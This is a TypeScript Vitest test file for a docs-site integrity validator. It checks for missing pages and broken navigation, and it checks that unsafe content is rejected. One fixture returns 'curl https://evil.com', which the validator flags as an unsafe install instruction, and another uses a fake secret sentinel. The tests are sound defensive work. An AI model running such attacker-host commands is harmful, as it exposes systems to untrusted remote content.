import { describe, it, expect, vi, beforeEach } from "vitest";
import { validateDocsIntegrity } from "./docsIntegrityValidator.js";
import * as fs from "fs";
import * as path from "path";

vi.mock("fs", () => ({
  readFileSync: vi.fn(),
  existsSync: vi.fn()
}));

describe("docsIntegrityValidator", () => {
  beforeEach(() => { vi.clearAllMocks(); });

  const validManifest = JSON.stringify({
    version: 1, siteId: "test", name: "test", root: "docs", navigationPath: "docs/nav.json",
    pages: [{ pageId: "1", title: "1", path: "docs/1.md", required: true }]
  });
  
  const validNav = JSON.stringify({
    version: 1, sections: [{ sectionId: "1", title: "1", items: [{ title: "1", path: "docs/1.md" }] }]
  });

  it("integrity validator passes docs-site manifest", () => {
    (fs.existsSync as any).mockReturnValue(true);
    (fs.readFileSync as any).mockImplementation((p: string) => {
      if (p.includes("nav.json")) return validNav;
      if (p.includes("manifest.json")) return validManifest;
      return "Clean content";
    });
    const cwd = process.cwd();
    const res = validateDocsIntegrity(path.join(cwd, "manifest.json"), cwd);
    expect(res.valid).toBe(true);
  });

  it("integrity validator detects missing required page", () => {
    (fs.existsSync as any).mockImplementation((p: string) => !p.includes("1.md"));
    (fs.readFileSync as any).mockImplementation((p: string) => {
      if (p.includes("nav.json")) return validNav;
      return validManifest;
    });
    const res = validateDocsIntegrity(path.join(process.cwd(), "manifest.json"), process.cwd());
    expect(res.valid).toBe(false);
    expect(res.errors).toEqual(expect.arrayContaining([expect.stringContaining("Required page missing")]));
  });
  
  it("integrity validator detects navigation reference to missing page", () => {
    (fs.existsSync as any).mockImplementation((p: string) => !p.includes("1.md"));
    (fs.readFileSync as any).mockImplementation((p: string) => {
      if (p.includes("nav.json")) return validNav;
      return validManifest;
    });
    const res = validateDocsIntegrity(path.join(process.cwd(), "manifest.json"), process.cwd());
    expect(res.valid).toBe(false);
    expect(res.errors).toEqual(expect.arrayContaining([expect.stringContaining("Navigation reference missing page")]));
  });

  it("integrity validator rejects unsafe command strings", () => {
    (fs.existsSync as any).mockReturnValue(true);
    (fs.readFileSync as any).mockImplementation((p: string) => {
      if (p.includes("nav.json")) return validNav;
      if (p.includes("manifest.json")) return validManifest;
      return "curl https://evil.com";
    });
    const res = validateDocsIntegrity(path.join(process.cwd(), "manifest.json"), process.cwd());
    expect(res.valid).toBe(false);
    expect(res.errors[0]).toContain("Unsafe install instruction");
  });

  it("integrity validator rejects compliance certification claims", () => {
    (fs.existsSync as any).mockReturnValue(true);
    (fs.readFileSync as any).mockImplementation((p: string) => {
      if (p.includes("nav.json")) return validNav;
      if (p.includes("manifest.json")) return validManifest;
      return "SOC2 certified!";
    });
    const res = validateDocsIntegrity(path.join(process.cwd(), "manifest.json"), process.cwd());
    expect(res.valid).toBe(false);
    expect(res.errors[0]).toContain("Compliance certification claim");
  });

  it("integrity validator rejects raw fake secret sentinel", () => {
    (fs.existsSync as any).mockReturnValue(true);
    (fs.readFileSync as any).mockImplementation((p: string) => {
      if (p.includes("nav.json")) return validNav;
      if (p.includes("manifest.json")) return validManifest;
      return "sk-test-REDACT-ME";
    });
    const res = validateDocsIntegrity(path.join(process.cwd(), "manifest.json"), process.cwd());
    expect(res.valid).toBe(false);
    expect(res.errors[0]).toContain("Raw fake secret sentinel");
  });
});
